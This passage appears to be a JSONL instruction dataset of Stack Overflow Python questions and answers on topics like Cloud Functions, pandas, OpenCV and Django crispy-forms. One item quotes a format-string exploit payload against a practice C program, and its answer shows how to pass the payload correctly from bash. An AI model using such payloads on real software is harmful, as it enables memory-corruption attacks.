&quot;\/layers\/google.python.pip\/pip\/lib\/python3.8\/site-packages\/google\/cloud\/storage\/blob.py&quot;, line 1183, in download_to_filename with open(filename, &quot;wb&quot;) as file_obj: OSError: [Errno 30] Read-only file system: 'temp.csv'\n<\/code><\/pre>\n<p>For context, I've already added credentials to the appropriate service account, which this cloud function uses as per the configurations I set up. So, authorization aside, I have no idea why the function failing. <strong>What should I change?<\/strong><\/p>\n<p>For context, I'm simply trying to open an arbitrary csv file from cloud storage in pandas and return the names of the columns as a string. This has no practical value, just a functional test before building something of value.<\/p>\n<p>Edit1: The specific IAM role given to the service account corresponding to the cloud function in question is 'roles\/editor' which should be sufficient, as far as I can know.<\/p>\n<p>Edit2: It appears that GCP cloud functions operate in a <a href=\"https:\/\/stackoverflow.com\/questions\/51308489\/google-clould-functions-deploy-erofs-read-only-file-system\">read only environment<\/a>. So there must be some other way to open the file, without using the <code>blob.download_to_filename<\/code> command.<\/p>","output_text":"<p>You are new on Cloud Functions and there are some stuff to know and some trap to avoid. One of them: Cloud Functions is stateless, you can't write on the file system.<\/p>\n<p><strong>Except<\/strong> on the <code>\/tmp<\/code> directory. It's a in memory file system (size correctly your Cloud Functions memory size to take into account your app memory footprint + the file size stored in the \/tmp dir)<\/p>\n<p>Update your Cloud Function like that<\/p>\n<pre><code>....\n    else:       \n        storage_client = storage.Client()\n        bucket = storage_client.bucket('my_bucket')\n        model_filename = &quot;my_file.csv&quot;\n        blob = bucket.blob(model_filename)\n        blob.download_to_filename('\/tmp\/temp.csv')        \n        with open('\/tmp\/temp.csv','rb') as f:\n            df = pd.read_csv(f)\n        \n        return str(df.columns)\n\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Different results when running C program from Python Subprocess vs in Bash<p>I've got a string\/argument that I'd like to pass to a C program. It's a string format exploit.<\/p>\n<pre><code>'\\xb2\\x33\\02\\x08%13x%2$n' \n<\/code><\/pre>\n<p>However, there seems to be different behaviours exhibited if I call the C program from Python by doing<\/p>\n<pre><code>subprocess.Popen([&quot;env&quot;, &quot;-i&quot;, &quot;.\/practice&quot;, '\\xb2\\x33\\02\\x08%13x%2$n'])\n<\/code><\/pre>\n<p>versus<\/p>\n<pre><code>.\/practice '\\xb2\\x33\\02\\x08%13x%2$n'\n<\/code><\/pre>\n<p>The difference is that the string exploit attack works as expected when calling the script via subprocess, but not when I call it through the CLI.<\/p>\n<p>What might the reason be? Thanks.<\/p>","output_text":"<p>Bash manpage says:<\/p>\n<blockquote>\n<p>Words of the form $'string' are treated specially.  The word expands to\nstring, with backslash-escaped characters replaced as specified by  the\nANSI  C  standard.  Backslash escape sequences, if present, are decoded\nas follows: [snipped]<br \/>\n<strong>\\xHH<\/strong>   the  eight-bit  character  whose value is the hexadecimal\nvalue HH (one or two hex digits)<\/p>\n<\/blockquote>\n<p>Then would you please try:<\/p>\n<pre><code>.\/practice $'\\xb2\\x33\\02\\x08%13x%2$n'\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python: count occurrences of an element in a column of 2D list<p>I have this data:<\/p>\n<pre><code>data = [[&quot;&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;],\n        [&quot;a&quot;, &quot;X&quot;, 1, &quot;X&quot;],\n        [&quot;b&quot;, &quot;X&quot;, 2, &quot;X&quot;],\n        [&quot;c&quot;, &quot;X&quot;, &quot;foo&quot;, 3]]\n<\/code><\/pre>\n<p>I want to count how many <code>X<\/code>'s there are in every column (except column 0). Also row 0 can be omitted, that's why there is this line: <code>if num1 &gt; 0 and num2 &gt; 0:<\/code>. I tried to do something like this:<\/p>\n<pre><code>def foo(data):\n    new_data = data\n    list1 = [&quot;nums&quot;]\n    indexes = []\n\n    for num1, row in enumerate(new_data):\n        for num2, col in enumerate(row):\n            if num1 &gt; 0 and num2 &gt; 0:\n                if col == &quot;X&quot;:\n                    indexes.append(num2) #e.g: if indexes = [1, 3, 1, 3, 1]: there is 3 &quot;X&quot;:s in column 1, and 2 &quot;X&quot;:s in column 3\n    indexes.sort()\n\n    new_data.append(list1)\n    return new_data\n\nfoo(data)\n<\/code><\/pre>\n<p>But I can't figure this out. The output should be like this:<\/p>\n<pre><code>[[&quot;&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;],\n[&quot;a&quot;, &quot;X&quot;, 1, &quot;X&quot;],\n[&quot;b&quot;, &quot;X&quot;, 2, &quot;X&quot;],\n[&quot;c&quot;, &quot;X&quot;, &quot;foo&quot;, 3]]\n[&quot;nums&quot;, 3, 0, 2]]\n<\/code><\/pre>\n<p>In <code>indexes<\/code> list I have indexes of each column as many times as <code>X<\/code> occurs in that specific column. Maybe I could somehow count them and add that number to <code>list1<\/code> to the place of the specified column?<\/p>\n<p>How could I solve this problem?<\/p>","output_text":"<p>Here is a possible solution:<\/p>\n<pre><code>result = data + [['nums'] + [sum(1 if data[row][col] == 'X' else 0\n                                 for row in range(1, len(data)))\n                             for col in range(1, len(data[0]))]]\n<\/code><\/pre>\n<p>After this operation <code>result<\/code> looks like this:<\/p>\n<pre><code>[[&quot;&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;],\n [&quot;a&quot;, &quot;X&quot;, 1, &quot;X&quot;],\n [&quot;b&quot;, &quot;X&quot;, 2, &quot;X&quot;],\n [&quot;c&quot;, &quot;X&quot;, &quot;foo&quot;, 3]]\n [&quot;nums&quot;, 3, 0, 2]]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n is the serial Number of a device unique?<p>I have multiple devices connected via a virtual serial port to my device. I want to know what specific device is connected to which COM port.<\/p>\n<p>with<\/p>\n<pre><code>import serial.tools.list_ports\n\nreslt = serial.tools.list_ports.comports()\n\n\nfor i in reslt:\n    print(i.hwid)\n    print(i)\n\n\n<\/code><\/pre>\n<p>I get<\/p>\n<pre><code>ACPI\\PNP0501\\5&amp;15D725F4&amp;0\nCOM5 - Kommunikationsanschluss (COM5)\nUSB VID:PID=0403:6001 SER=MAO74LCRA\nCOM3 - USB Serial Port (COM3)\nUSB VID:PID=0403:6001 SER=FT41M1WWA\nCOM6 - USB Serial Port (COM6)\n\n<\/code><\/pre>\n<p>Some how the Vendor\/ Product ID are the same, but the Serial is different.\nSo are the Serial numbers from the devices<code> ( SER=MAO74LCRA, SER=FT41M1WWA)<\/code> unique?<\/p>","output_text":"<p>Yes, Serial numbers from devices are unique. That\u2019s their purpose, identification.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Allure Framework: Expected at least 1 argument, got 0<p>I have installed the robot framework and related libraries. Then I have installed the allure framework.\nI have followed the following command in cmd prompt to install allure framework,<\/p>\n<blockquote>\n<p>pip install allure-robotframework\nrobot --listener 'allure_robotframework;.\/results\/allure'<\/p>\n<\/blockquote>\n<p>But when I run the second command, it displays below error message<\/p>\n<p>[ ERROR ] Expected at least 1 argument, got 0.<\/p>\n<p>Please help me to solve this issue.<\/p>","output_text":"<p>from the command you're running it seems you're missing the tests that need to be executed.<\/p>\n<p>make sure to pass the tests folder\/suite to be executed as parameter:<\/p>\n<p><code>robot --listener 'allure_robotframework;.\/results\/allure' tests\/foo\/baz.robot<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n No module named 'google trans'<p>I've got warning while installing the <code>pip googletrans<\/code>.<\/p>\n<p>The warning says in the picture:<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/tN5Ot.png\" alt=\"The warning says in the picture\" \/><\/p>\n<p>Does it affect my code? the error says &quot;No module named 'google trans'?<\/p>\n<p>error-screenshot:<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/tEvbA.png\" alt=\"error-screenshot\" \/><\/p>\n<pre><code>from tkinter import *\nimport googletrans\nimport textblob\nfrom tkinter import ttk, messagebox\n\nroot = Tk ()\nroot.title('Codemy.com - Translator')\nroot.geometry(&quot;880x300&quot;)\n\ndef translate_it():\n    pass\n\n# Text Boxes\noriginal_text = Text(root, height=10, width=40)\noriginal_text.grid(row=0, column=0, pady=20, padx=10)\n\ntranslate_button = Button(root, text=&quot;Translate!&quot;, font=(&quot;Helvetica&quot;, 24), command=translate_it)\ntranslate_button.grid(row=0, column=1, padx=10)\n\ntranslated_text = Text(root, height=10, width=40)\ntranslated_text.grid(row=0, column=2, pady=20, padx=10)\n\nroot.mainloop()\n<\/code><\/pre>","output_text":"<p>Check if the directory of the googletrans module and make sure it's within the list.\nYou can check the directories that python reads with:<\/p>\n<pre><code>import sys\nsys.path\n<\/code><\/pre>\n<p>You can add the directory of googletrans with:<\/p>\n<pre><code>sys.path.append('\/Users\/name\/Documents')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to combine two lists of dictionaries of multiple entries<p>I have two lists of dictionaries and I want to combine or merge both of them. The obstruction here is I want to combine them based on the key value and this key value is different in every iteration, they are not fixed, how do I accomplish this?\nFollowing are the two Lists of Dictionaries I have which needs to be merged.<\/p>\n<pre><code>l1 = [\n    {'Fvcm':{\n            'name' :'FVCM',\n            'size' : 8,\n             'Type' : 'Z'\n            }\n    },\n    {'RPZM':{\n            'name' :'RPZM',\n            'size' : 8,\n             'Type' : 'R'\n            },\n    },\n    {'ZAN':{\n            'name' :'ZAN',\n            'size' : 8,\n             'Type' : 'P'\n            }\n    }\n    ]\n\nl2 = [\n    {'Fvcm':{\n            'name' :'FVCM',\n            'map' : 'Prim1'\n            }\n    },\n    {'RPZM':{\n            'name' :'RPZM',\n            'map' : 'Prim2'\n            },\n    },\n    {'ZAN':{\n            'name' :'ZAN',\n            'map' : 'Prim3'\n            }\n    }\n    ]\n<\/code><\/pre>\n<p>and I want the final result to look like:<\/p>\n<pre><code>l3 = [\n    {'Fvcm':{\n            'name' :'FVCM',\n            'map' : 'Prim1',\n            'size' : 8,\n             'Type' : 'Z'\n            }\n    },\n    {'RPZM':{\n            'name' :'RPZM',\n            'map' : 'Prim2',\n            'size' : 8,\n             'Type' : 'R'\n            },\n    },\n    {'ZAN':{\n            'name' :'ZAN',\n            'map' : 'Prim3',\n            'size' : 8,\n             'Type' : 'P'\n            }\n    }\n    ]\n<\/code><\/pre>\n<p>Thanks in advance!<\/p>","output_text":"<p>You can use <a href=\"https:\/\/docs.python.org\/3\/library\/stdtypes.html#dict.update\" rel=\"nofollow noreferrer\">update<\/a>, to merge 2 dictionaries together. That requires to modify your nested list-of-dicts structure into non nested dicts:<\/p>\n<pre><code>d1 = {k: v for item in l1 for k, v in item.items()} # regular k,v dict\nd2 = {k: v for item in l2 for k, v in item.items()} # same\n_ = [d1[k].update(v) for (k, v) in d2.items()]      # update each key in d1 with its corresponding value from d2\nprint(d1)\n<\/code><\/pre>\n<p>Out:<\/p>\n<pre><code>{'Fvcm': {'name': 'FVCM', 'size': 8, 'Type': 'Z', 'map': 'Prim1'}, 'RPZM': {'name': 'RPZM', 'size': 8, 'Type': 'R', 'map': 'Prim2'}, 'ZAN': {'name': 'ZAN', 'size': 8, 'Type': 'P', 'map': 'Prim3'}}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do i separate overlapping cards from each other using python opencv?<p>I am trying to detect playing cards and transform them to get a bird's eye view of the card using python opencv. My code works fine for simple cases but I didn't stop at the simple cases and want to try out more complex ones. I'm having problems finding correct contours for cards.Here's an attached image where I am trying to detect cards and draw contours:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/NLjCL.jpg\" rel=\"noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/NLjCL.jpg\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>My Code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>path1 = &quot;F:\\\\ComputerVisionPrograms\\\\images\\\\cards4.jpeg&quot;\ng = cv2.imread(path1,0)\nimg = cv2.imread(path1)\n\nedge = cv2.Canny(g,50,200)\n\np,c,h = cv2.findContours(edge, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\nrect = []\nfor i in c:\n    p = cv2.arcLength(i, True)\n    ap = cv2.approxPolyDP(i, 0.02 * p, True)\n    if len(ap)==4:\n        rect.append(i)\ncv2.drawContours(img,rect, -1, (0, 255, 0), 3)\n\nplt.imshow(img)\nplt.show()\n<\/code><\/pre>\n<p>Result:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/f0OhS.png\" rel=\"noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/f0OhS.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>This is not what I wanted, I wanted only the rectangular cards to be selected but since they are occluding one another, I am not getting what I expected. I believe I need to apply morphological tricks or other operations to maybe separate them or make the edges more prominent or may be something else. It would be really appreciated if you could share your approach to tackle this problem.<\/p>\n<p>A few more examples requested by other fellows:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/eCSNU.jpg\" rel=\"noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/eCSNU.jpg\" alt=\"enter image description here\" \/><\/a><\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/EjSBq.jpg\" rel=\"noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/EjSBq.jpg\" alt=\"enter image description here\" \/><\/a><\/p>","output_text":"<p>There are lots of approaches to find overlapping objects in the image. The information you have for sure is that your cards are all rectangles, mostly white and have the same size. Your variables are brightness, angle, may be some perspective distortion. If you want a robust solution, you need to address all that issues.<\/p>\n<p>I suggest using Hough transform to find card edges. First, run a regular edge detection. Than you need to clean up the results, as many short edges will belong to &quot;face&quot; cards. I suggest using a combination of dilate(11)-&gt;erode(15)-&gt;dilate(5). This combination will fill all the gaps in the &quot;face&quot; card, then it &quot;shrinks&quot; down the blobs, on the way removing the original edges and finally grow back and overlap a little the original face picture. Then you remove it from the original image.<\/p>\n<p>Now you have an image that have almost all the relevant edges. Find them using Hough transform. It will give you a set of lines. After filtering them a little you can fit those edges to rectangular shape of the cards.<\/p>\n<pre><code>dst = cv2.Canny(img, 250, 50, None, 3)\n\ncn = cv2.dilate(dst, cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (11, 11)))\ncn = cv2.erode(cn, cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (15, 15)))\ncn = cv2.dilate(cn, cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (5, 5)))\ndst -= cn\ndst[dst &lt; 127] = 0\n\ncv2.imshow(&quot;erode-dilated&quot;, dst)\n\n# Copy edges to the images that will display the results in BGR\ncdstP = cv2.cvtColor(dst, cv2.COLOR_GRAY2BGR)\n\nlinesP = cv2.HoughLinesP(dst, 0.7, np.pi \/ 720, 30, None, 20, 15)\n\nif linesP is not None:\n    for i in range(0, len(linesP)):\n        l = linesP[i][0]\n        cv2.line(cdstP, (l[0], l[1]), (l[2], l[3]), (0, 255, 0), 2, cv2.LINE_AA)\n\ncv2.imshow(&quot;Detected edges&quot;, cdstP)\n<\/code><\/pre>\n<p>This will give you following:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/cMACk.png\" rel=\"noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/cMACk.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Finding string elements of an array in another array<p>I have two sorted arrays <code>h<\/code> and <code>M<\/code>:<\/p>\n<pre><code>h = np.array(['blue', 'red', 'white'])\nM = np.array(['blue', 'green', 'orange', 'red', 'white'])\n<\/code><\/pre>\n<p>and would like to find the indices at which each element of <code>h<\/code> appears in <code>M<\/code><\/p>\n<p>Can I <code>np.where<\/code> for this?<\/p>\n<p>Also, it can be the case that an element of <code>h<\/code> might not appear in <code>M<\/code> and in this case, I don't require the index for it. The elements do not repeat.<\/p>","output_text":"<p>This is another way and is a one-liner that will return an <code>ndarray<\/code> of the indices of the matches.<\/p>\n<pre><code>np.nonzero(np.in1d(M, h))[0]\n<\/code><\/pre>\n<p>Output<\/p>\n<pre><code>array([0, 3, 4])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Error while removing punctuations and numbers from text file<p>I am trying to clean up a text file by removing punctuations, numbers and <br> etc.<\/p>\n<p>I wrote this code to try removing punctuations initially :<\/p>\n<pre><code>import string\nwith open(&quot;uniquewords_list.txt&quot;) as f:\n\n         L = sorted(word.strip(&quot;,&quot;) for line in f for word in line.split())\n         \n         out = L.translate(string.maketrans(&quot;&quot;,&quot;&quot;), string.punctuation)\n\n         with open('testing.txt', 'w') as filehandle:\n              for listitem in out:\n                  filehandle.write('%s\\n' % listitem)\n<\/code><\/pre>\n<p>However I am getting an error :<\/p>\n<pre><code>out = L.translate(string.maketrans(&quot;&quot;,&quot;&quot;), string.punctuation)\nAttributeError: 'list' object has no attribute 'translate'\n<\/code><\/pre>\n<p>I looked up the error description but still not able to fix it. Suggestions ?<\/p>\n<p><strong>Also, to delete numbers and characters like <br> what is an efficient way to do ?<\/strong><\/p>","output_text":"<pre><code>import string\nwith open(&quot;uniquewords_list.txt&quot;) as f:\n\n     contents = f.read()\n     remove_pool = string.punctuation + '0123456789'  # + etc\n     contents = ''.join(ch for ch in contents if ch not in remove_pool)\n\n     with open('testing.txt', 'w') as filehandle:\n          filehandle.write(contents + '\\n')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Comparing Zscore per values and mark them as NaN if it goes above a certain score<p>I am trying to work on a requirement where I am computing the Zscore and want to compare with individual values in the rows. If Zscore&gt;1 mark them as <code>NaN<\/code> for those specific values. I am marking it as <code>NaN<\/code>, so that I could fill those values by appropriate techniques.<\/p>\n<p>I have the below code:<\/p>\n<pre><code>s={'2014':[1,1,2,2],'2015':[12,22,33,44],'2016':[55,66,77,88],'2017':[2,3,4,5]}\np=pd.DataFrame(data=s)\n\n     2014 2015 2016 2017\n   0    1   12  55   2\n   1    1   22  66   3\n   2    2   33  77   4\n   3    2   44  88   5\n<\/code><\/pre>\n<p>I have computed zscore as -<\/p>\n<pre><code>df_zscore = (p - p.mean())\/p.std()\n\n       2014       2015        2016       2017\n0   -0.866025   -1.139879   -1.161895   -1.161895\n1   -0.866025   -0.416146   -0.387298   -0.387298\n2   0.866025    0.379960    0.387298    0.387298\n3   0.866025    1.176065    1.161895    1.161895\n<\/code><\/pre>\n<p>If Zscore&gt;1, then the desired output should be like:<\/p>\n<pre><code>       2014       2015        2016       2017\n0      1          12          55         2\n1      1          22          66         3\n2      2          33          77         4\n3      2          NaN         NaN       NaN\n<\/code><\/pre>\n<p>(They are marked as NaN, since Zscore was &gt;1)<\/p>\n<p>How would I be able to get here?<\/p>","output_text":"<p>You could <code>mask<\/code> it:<\/p>\n<pre><code>df_zscore = (p - p.mean()) \/ p.std()\nout = p.mask(df_zscore &gt; 1)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>   2014  2015  2016  2017\n0     1  12.0  55.0   2.0\n1     1  22.0  66.0   3.0\n2     2  33.0  77.0   4.0\n3     2   NaN   NaN   NaN\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to delete folder with python?<p>I want to delete a folder inside the Windows drive <strong>'C'<\/strong><\/p>\n<p>but i get <strong>PermissionError<\/strong><\/p>\n<p>I used the 'os' module as usual but I do not know exactly how to solve the <strong>access<\/strong> problem<\/p>\n<p><strong>Code:<\/strong><\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import os\nos.remove(&quot;C:\\\\Users\\name\\AppData\\Local\\Temp&quot;)\n<\/code><\/pre>\n<p><strong>Error:<\/strong><\/p>\n<pre><code>line 2, in &lt;module&gt;\n   os.remove(&quot;C:\\\\Users\\name\\AppData\\Local\\Temp&quot;)\nPermissionError: [WinError 5] Access is denied: 'C:\\\\Users\\\\name\\\\AppData\\\\Local\\\\Temp'\n<\/code><\/pre>","output_text":"<p>In order to delete a folder in Python you can use os.rmdir but only <strong>for empty directories<\/strong><\/p>\n<p>For non-empty ones you can use shutil.rmtree, see <a href=\"https:\/\/docs.python.org\/3\/library\/shutil.html#shutil.rmtree\" rel=\"nofollow noreferrer\">https:\/\/docs.python.org\/3\/library\/shutil.html#shutil.rmtree<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n TemplateDoesNotExist at \/users\/register\/ bootstrap5\/uni_form.html<p>I am building a registration form for my django project, and for styling it I am using crispy forms. But, when I run my server and go to my registration page, I see this error:<\/p>\n<pre><code>    Internal Server Error: \/users\/register\/\nTraceback (most recent call last):\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\backends\\django.py&quot;, line 61, in render\n    return self.template.render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 170, in render\n    return self._render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 162, in _render\n    return self.nodelist.render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 938, in render\n    bit = node.render_annotated(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 905, in render_annotated\n    return self.render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\loader_tags.py&quot;, line 150, in render\n    return compiled_parent._render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 162, in _render\n    return self.nodelist.render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 938, in render\n    bit = node.render_annotated(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 905, in render_annotated\n    return self.render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\loader_tags.py&quot;, line 62, in render\n    result = block.nodelist.render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 938, in render\n    bit = node.render_annotated(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 905, in render_annotated\n    return self.render(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 988, in render\n    output = self.filter_expression.resolve(context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\base.py&quot;, line 698, in resolve\n    new_obj = func(obj, *arg_vals)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\crispy_forms\\templatetags\\crispy_forms_filters.py&quot;, line 60, in as_crispy_form\n    template = uni_form_template(template_pack)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\crispy_forms\\templatetags\\crispy_forms_filters.py&quot;, line 21, in uni_form_template\n    return get_template(&quot;%s\/uni_form.html&quot; % template_pack)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\loader.py&quot;, line 19, in get_template\n    raise TemplateDoesNotExist(template_name, chain=chain)\ndjango.template.exceptions.TemplateDoesNotExist: bootstrap5\/uni_form.html\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\core\\handlers\\exception.py&quot;, line 47, in inner\n    response = get_response(request)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\core\\handlers\\base.py&quot;, line 179, in _get_response\n    response = wrapped_callback(request, *callback_args, **callback_kwargs)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\microblog_project\\users\\views.py&quot;, line 17, in register\n    return render(request, 'users\/register.html',context)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\shortcuts.py&quot;, line 19, in render\n    content = loader.render_to_string(template_name, context, request, using=using)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\loader.py&quot;, line 62, in render_to_string\n    return template.render(context, request)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\backends\\django.py&quot;, line 63, in render\n    reraise(exc, self.backend)\n  File &quot;C:\\Users\\Dell\\Desktop\\Django\\microblog\\venv\\lib\\site-packages\\django\\template\\backends\\django.py&quot;, line 84, in reraise\n    raise new from exc\ndjango.template.exceptions.TemplateDoesNotExist: bootstrap5\/uni_form.html\n<\/code><\/pre>\n<p>This doesn't look like the usual <code>TemplateDoesNotExistError<\/code> I get. I think this is the error in my crispy form, because if I remove the crispy template tags in my form, everything works fine.<\/p>\n<p>Here is my register template:<\/p>\n<pre><code>{% extends 'base.html' %}\n{% load crispy_forms_tags %}\n\n{% block title %}Register{% endblock %}\n\n{% block content %}\n&lt;h1&gt;Sign up for a new account&lt;\/h1&gt;\n&lt;hr&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n    {% csrf_token %}\n    {{ form|crispy }}\n    &lt;button type=&quot;submit&quot; class=&quot;btn btn-sm btn-primary&quot;&gt;Register&lt;\/button&gt;\n&lt;\/form&gt;\n&lt;p&gt;\n    Already have an account?\n    &lt;a href=&quot;#&quot;&gt;Log in&lt;\/a&gt;\n&lt;\/p&gt;\n{% endblock %}\n<\/code><\/pre>\n<p>And just in case it is required, here is my view function:<\/p>\n<pre><code>def register(request):\n    form = RegistrationForm()\n\n    if request.method == 'POST':\n        form = RegistrationForm(data=request.POST)\n        if form.is_valid():\n            form.save()\n            return HttpResponse(&quot;Successfully Registered!!!&quot;)\n\n    context = {\n        'form':form,\n    }\n    return render(request, 'users\/register.html',context)\n<\/code><\/pre>\n<p>I have specefied CRISPY_TEMPLATE_PACK in my settings.py and also added crispy_forms to my INSTALLED_APPS. Where am I going wrong?<\/p>\n<p>EDIT:<\/p>\n<p>So I did a bit more research on this topic and this error is probably because crispy forms does not support bootstrap 5 yet. So, by changing the bootstrap5 to bootstrap4 in my CRISPY_TEMPLATE_PACK, the error is solved<\/p>","output_text":"<p><a href=\"https:\/\/django-crispy-forms.readthedocs.io\/en\/latest\/install.html\" rel=\"nofollow noreferrer\">Based on the latest crispy form doc<\/a>, it seems that there is no built-in <code>bootstrap5<\/code> for it. Are you sure you are using <code>bootstrap5<\/code>?<\/p>\n<p>Currently, there are only bootstrap, bootstrap3, bootstrap4, and uni-form.<\/p>\n<p>You can take a look at your file structure if you even see <code>bootstrap5<\/code> folder.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to input mutilple data types (int, float, string) in a loop and sort it into different lists in python?<p>I want input multiple data types and put them into lists.<\/p>\n<p>Sample inputs of :<\/p>\n<p><code>-1,   0.5,   'abc',   32<\/code><\/p>\n<p>would lead to a final output of:<\/p>\n<p>A= <code>[-1, 32]<\/code>,\nB= <code>[0.5]<\/code>,\nC= <code>['abc']<\/code><\/p>\n<p>I try to do it but every element is placed into list <code>C<\/code><\/p>\n<p>My code:<\/p>\n<pre><code>n = int(input(&quot;N = &quot;))\nlst = []\ndata = &quot;&quot;\nfor i in range(n):\n    print(&quot;add element&quot;, i+1, &quot;: &quot;, end='')\n    data = input()\n    list(data)\n    lst.append(data)\nA = []\nB = []\nC = []\nfor x in lst:\n    if isinstance(x, int):\n        A.append(x)\n    elif isinstance(x, float):\n        B.append(x)\n    else:\n        C.append(x)\nprint(&quot;A = &quot;, A)\nprint(&quot;B = &quot;, B)\nprint(&quot;C = &quot;, C)\n<\/code><\/pre>","output_text":"<p>Since all your input values are strings, the way to separate them is to try and convert them into the types you are trying to sort to. For example:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>A = []\nB = []\nC = []\n\nlst = ['-1', '0.5', 'abc', '32']\nfor x in lst:\n    try:\n        A.append(int(x))\n    except ValueError:\n        try:\n            B.append(float(x))\n        except ValueError:\n            C.append(x)\n\nprint(A, B, C) \n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>[-1, 32] [0.5] ['abc']\n<\/code><\/pre>"}
